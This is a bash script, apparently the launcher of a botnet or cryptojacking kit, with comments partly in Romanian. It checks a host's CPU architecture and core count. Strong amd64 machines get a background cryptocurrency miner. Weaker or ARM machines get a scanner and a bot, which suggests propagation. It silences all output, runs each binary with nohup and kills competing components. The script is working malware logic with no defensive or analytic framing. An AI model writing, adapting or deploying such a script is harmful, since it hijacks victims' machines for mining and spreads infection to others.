#!/usr/bin/env bash
set -euo pipefail

DIR="$(cd -- "$(dirname -- "$0")" && pwd)"
SCAN_NAME="${1:-scanfile}"
MINER_NAME="${2:-minefile}"
BOT_NAME="${3:-botfile}"
SCAN_ARGS="${4:-}"

SCAN="$DIR/$SCAN_NAME"
MINER="$DIR/$MINER_NAME"
BOT="$DIR/$BOT_NAME"

# normalize arch
arch="$(uname -m || true)"
case "$arch" in
  x86_64|amd64) arch="amd64" ;;
  aarch64) arch="arm64" ;;
esac

# cores
cores="$(nproc 2>/dev/null || echo 1)"
if [ -z "$cores" ]; then cores=1; fi

# helper: start if not running
start_bg() {
  local bin="$1"; shift
  local args=("$@")
  [ -x "$bin" ] || chmod +x "$bin" 2>/dev/null || true
  if ! pgrep -f -- "$bin" >/dev/null 2>&1; then
    nohup "$bin" "${args[@]}" >/dev/null 2>&1 &
  fi
}

# helper: stop if running
stop_if_running() {
  local bin="$1"
  pgrep -f -- "$bin" >/dev/null 2>&1 || return 0
  pkill -f -- "$bin" || true
}

# DECIZIE: miner-only vs scan+bot
if [ "$arch" = "amd64" ]; then
  if [ "$cores" -ge 4 ]; then
    # miner only
    [ -x "$MINER" ] || exit 0
    start_bg "$MINER"
    stop_if_running "$SCAN"
    stop_if_running "$BOT"
  else
    # amd64 & <4 cores -> doar scan
    if [ -x "$SCAN" ]; then
      start_bg "$SCAN" $SCAN_ARGS
    fi
    stop_if_running "$MINER"
    stop_if_running "$BOT"
  fi
else
  # non-amd64 -> scan + bot
  if [ -x "$SCAN" ]; then
    start_bg "$SCAN" $SCAN_ARGS
  fi
  if [ -x "$BOT" ]; then
    start_bg "$BOT"
  fi
  stop_if_running "$MINER"
fi

